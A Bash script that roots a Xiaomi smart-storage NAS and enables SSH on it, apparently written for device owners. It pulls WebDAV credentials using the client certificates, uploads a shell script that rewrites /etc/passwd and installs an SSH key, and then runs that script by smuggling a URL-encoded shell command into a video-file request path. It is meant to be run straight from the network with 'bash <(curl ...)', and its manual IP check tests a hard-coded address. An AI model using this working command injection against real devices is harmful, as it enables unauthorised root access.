#!/bin/bash
# Ver: 1.0.8.425.F24C26D24-REL (Enhanced)
# 食用步骤：
# - 登录小米智能存储客户端，以拉取证书文件
# - 打开终端（Windows 下请使用 WSL Ubuntu 终端）
# - 终端执行 bash <(curl -s https://raw.githubusercontent.com/scruel/xiaomi-storage-nas-enable-ssh/refs/heads/main/minas-enable-ssh_wsl.sh)
# - 提示执行完毕，输出 root 信息即成功，APP 文件中也能看到 SUCCESS。
# 终端依赖：openssl, curl, ssh-keygen, wslpath (WSL)

echo "################################################"
echo "#   __  __    ___    _   _      _      ____    #"
echo "#  |  \/  |  |_ _|  | \ | |    / \    / ___|   #"
echo "#  | |\/| |   | |   |  \| |   / _ \   \___ \   #"
echo "#  | |  | |   | |   | |\  |  / ___ \   ___) |  #"
echo "#  |_|  |_|  |___|  |_| \_| /_/   \_\ \____/   #"
echo "#                                              #"
echo "################################################"
echo "小米智能存储一键开启 SSH + root    @Scruel 2026.08"
echo "################################################"


VERBOSE=0
# check arg -v, if present, set VERBOSE = True
if [ $# -gt 0 ] && [ "$1" = "-v" ]; then
    VERBOSE=1
fi

# ---------- 清理临时文件 ----------
cleanup() {
    rm -f /tmp/enable-ssh.sh
}
trap cleanup EXIT

check_commands() {
    for cmd in openssl curl ssh-keygen wslpath; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            echo "命令 '$cmd' 未找到，请安装后再试。" >&2
            exit 1
        fi
    done
}
check_commands

# ---------- 获取 NAS IP ----------
read_nas_ip() {
    while true; do
        echo "请输入小米智能存储的内网 IP 地址: " >&2
        read NAS_IP
        if [[ -z "$NAS_IP" ]]; then
            echo "IP 地址不能为空，请重新输入。" >&2
        elif ! [[ $(dig -x 192.168.216.19 +short 2>/dev/null) =~ minas ]]; then
            echo "IP 可能错误或指向非小米智能存储，请检查设备状态。" >&2
        else
            break
        fi
    done
}

echo "尝试自动获取小米智能存储的内网 IP..."
NAS_IP=
PREFIX=$(ip -4 addr show | grep -v 127.0.0 | grep inet | head -1 | awk '{print $2}' | cut -d/ -f1 | cut -d. -f1-3)
if [ $VERBOSE -eq 1 ]; then
    echo "PREFIX: $PREFIX"
fi
for i in {1..254}; do
    name=$(dig -x "$PREFIX.$i" +short 2>/dev/null)
    [[ "$name" =~ minas ]] && { NAS_IP="$PREFIX.$i"; break; }
done
if [[ -z "$NAS_IP" ]]; then
    echo "无法自动找到小米智能存储的内网 IP，请检查设备状态并手动输入" >&2
    NAS_IP=$(read_nas_ip)
fi
echo "小米智能存储 IP: $NAS_IP"

# ---------- 获取 CN (证书通用名) ----------
echo "正在从 NAS 获取证书 CN..."
CN=$(echo | openssl s_client -connect "$NAS_IP":443 -servername x 2>/dev/null | openssl x509 -noout -subject | sed 's/.*CN = \([^,]*\).*/\1/')
if [[ -z "$CN" ]]; then
    echo "无法提取证书 CN，请检查设备状态。" >&2
    exit 1
fi
echo "CN: $CN"

# ---------- 准备证书文件 ----------
check_cert_files() {
    local missing=()

    [[ ! -f "$CA_FILE" ]] && missing+=("ca_chain.pem")
    [[ ! -f "$CERT_FILE" ]] && missing+=("*_cert.pem")
    [[ ! -f "$KEY_FILE" ]] && missing+=("*_private_key.pem")

    if [[ ${#missing[@]} -eq 0 ]]; then
        return 0
    else
        echo "证书文件缺失：" >&2
        for m in "${missing[@]}"; do
            echo "  - $m" >&2
        done
        echo "检测路径: $CERT_HOME" >&2
        return 1
    fi
}

prep_certfiles() {
    TRY_CNT=0
    while true; do
        # Windows WSL 下自动获取证书路径
        if [ -f /proc/sys/fs/binfmt_misc/WSLInterop ] && [ $TRY_CNT -lt 3 ]; then
            LOCALAPPDATA=$(wslpath "$(cmd.exe /c echo %LOCALAPPDATA% 2>/dev/null | tr -d '\r')" 2>/dev/null)
            CERT_HOME="$LOCALAPPDATA/minasCert"
            NOT_FOUND_TIPS="无法找到证书文件，请确保已登录小米智能存储客户端"
        else
            CERT_HOME=/tmp/minascert
            mkdir -p $CERT_HOME
            NOT_FOUND_TIPS="无法自动找到证书文件，请手动复制至 $CERT_HOME"
        fi

        CA_FILE="$CERT_HOME/ca_chain.pem"
        CERT_FILE=$(find "$CERT_HOME" -maxdepth 1 -type f -name "*_cert.pem")
        KEY_FILE=$(find "$CERT_HOME" -maxdepth 1 -type f -name "*_private_key.pem")
        if check_cert_files; then
            echo "证书文件已就绪，目录：$CERT_HOME"
            break
        fi
        echo $NOT_FOUND_TIPS
        echo "请确认证书文件已就绪后再按回车键继续..."
        read
        TRY_CNT=$((TRY_CNT + 1))
    done
}

prep_certfiles
# 构造证书参数
CERT_ARGS=(
    --cacert "$CA_FILE"
    --cert "$CERT_FILE"
    --key "$KEY_FILE"
)

# ---------- 获取 WebDAV 凭证 ----------
echo "获取 WebDAV 凭证..."
RESP=$(curl -s "${CERT_ARGS[@]}" --resolve "$CN:443:$NAS_IP" \
    -X POST -H "Content-Type: application/json" -d '{}' \
    "https://$CN/cgi-bin/luci/filemgr/get_pool_info" 2>/dev/null)
if [[ -z "$RESP" ]]; then
    echo "获取 WebDAV 凭证失败，请检查网络或证书是否有效。" >&2
    exit 1
fi

WDV_USER=$(echo "$RESP" | grep -o '"username":"[^"]*"' | sed 's/"username":"\(.*\)"/\1/' 2>/dev/null)
WDV_PWD=$(echo "$RESP" | grep -o '"password":"[^"]*"' | sed 's/"password":"\(.*\)"/\1/' 2>/dev/null)
if [[ -z "$WDV_USER" || -z "$WDV_PWD" ]]; then
    echo "无法解析 WebDAV 凭证。" >&2
    exit 1
fi
CREDS="$WDV_USER:$WDV_PWD"
echo "WebDAV 用户凭证解析成功: $WDV_USER"
if [ $VERBOSE -eq 1 ]; then
    echo "WebDAV 密码: $WDV_PWD"
fi

# ---------- 生成 SSH 密钥 ----------
if [[ -f "$HOME/.ssh/id_ed25519" && -f "$HOME/.ssh/id_ed25519.pub" ]]; then
    echo "密钥文件已存在，直接使用原有密钥对（有需要重新生成请自行生成）。"
else
    echo "生成 SSH 密钥对 (ed25519)..."
    ssh-keygen -q -t ed25519 -N '' -f $HOME/.ssh/id_ed25519 -C "" <<< y > /dev/null 2>&1
    echo "密钥文件已生成，存放于 ~/.ssh"
fi
PUB_KEY=$(sed 's/[[:space:]]*$//' $HOME/.ssh/id_ed25519.pub)

# ---------- 准备 enable-ssh.sh 脚本 ----------
cat > /tmp/enable-ssh.sh << EOF
#!/bin/sh
[ ! -f /etc/passwd.bak ] && cp /etc/passwd /etc/passwd.bak

mkdir -p /home/rootx/.ssh
ln -snf /firmware/models /home/rootx/models
sed -i 's|:/root:|:/home/rootx:|' /etc/passwd

DOCKER_CMD='export PATH="\$PATH:/data/docker"'
touch /home/rootx/.profile
if ! grep -Fqx "\$DOCKER_CMD" "/home/rootx/.profile"; then
  printf '%s\n' "\$DOCKER_CMD" >> /home/rootx/.profile
fi

echo "$PUB_KEY" > /home/rootx/.ssh/authorized_keys
chmod 700 /home/rootx/.ssh
chmod 600 /home/rootx/.ssh/authorized_keys
echo 'DROPBEAR_EXTRA_ARGS=" -s"' > /etc/default/dropbear

usermod -s /bin/sh root
systemctl enable dropbear.socket
systemctl start dropbear.socket
mitee_tool rpmb set ssh_en true || true

touch /nas/pool0/$WDV_USER/data/SUCCESS
chown $WDV_USER:$WDV_USER /nas/pool0/$WDV_USER/data/SUCCESS
rm /nas/pool0/$WDV_USER/data/enable-ssh.sh
EOF

sed -i 's/\r$//' /tmp/enable-ssh.sh

# ---------- 上传 enable-ssh.sh 到 NAS ----------
echo "上传 enable-ssh.sh 到 NAS ..."
HTTP_CODE=$(curl -s -w "%{http_code}" -o /dev/null \
    -u "$CREDS" "${CERT_ARGS[@]}" \
    --resolve "$CN:5000:$NAS_IP" \
    -T /tmp/enable-ssh.sh \
    "https://$CN:5000/pool0/data/enable-ssh.sh")

if [[ "$HTTP_CODE" -ne 204 ]]; then
    echo "上传脚本失败，HTTP 状态码: $HTTP_CODE" >&2
    exit 1
fi
echo "上传 enable-ssh.sh 脚本成功 (HTTP $HTTP_CODE)"

# ---------- 触发执行 enable-ssh.sh ----------
echo "请求执行 enable-ssh.sh 脚本..."
P="/pool0/video/__X2%22%3Bsh%20%24%28printf%20%27%5C57nas%5C57pool0%5C57$WDV_USER%5C57data%5C57enable-ssh.sh%27%29%3B%22__.ts"
curl -s -g -u "$CREDS" "${CERT_ARGS[@]}" --resolve "$CN:5000:$NAS_IP" "https://$CN:5000$P" -o /dev/null
sleep 3

# ---------- 测试 SSH 连接 ----------
echo "测试 SSH 连接..."
if ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 root@"$NAS_IP" id 2>/dev/null; then
    echo "SSH 连接成功！所有步骤完成！${NC}"
    echo "建议备份私钥，以免后续无法登录: ~/.ssh/id_ed25519"
    echo "SSH 登录命令: ssh root@$NAS_IP"
else
    echo "SSH 连接失败。" >&2
    exit 1
fi
